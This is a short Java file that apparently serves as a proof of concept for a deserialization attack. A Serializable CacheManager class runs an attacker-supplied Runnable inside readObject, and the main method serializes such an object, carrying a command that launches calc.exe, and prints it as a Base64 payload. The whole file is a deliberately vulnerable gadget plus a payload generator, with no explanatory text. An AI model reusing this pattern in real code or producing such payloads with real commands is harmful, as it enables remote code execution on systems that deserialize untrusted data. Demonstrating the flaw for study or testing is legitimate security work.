import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;


@SuppressWarnings("serial")
public class CacheManager implements Serializable {
	private Runnable initHook;
	private void readObject(ObjectInputStream ois) {
		try {
			ois.defaultReadObject(); // populate initHook
		} catch (Exception e) {} 
		initHook.run(); 
	}
	
	public CacheManager(Runnable initHook) {
		this.initHook = initHook;
	}
	
	// ...	
	
	public static void main(String[] args) throws IOException, ClassNotFoundException {
		ByteArrayOutputStream out = new ByteArrayOutputStream();
		ObjectOutputStream oos = new ObjectOutputStream(out);
		
		CacheManager cm = new CacheManager(new CommandTask("calc.exe"));
		
		oos.writeObject(cm);
		
		// test deserialization
//		ByteArrayInputStream in = new ByteArrayInputStream(out.toByteArray());
//		ObjectInputStream ois = new ObjectInputStream(in);
//		ois.readObject(); 
		
		System.out.println(new String(Base64.getEncoder().encode(out.toByteArray())));
	}
}
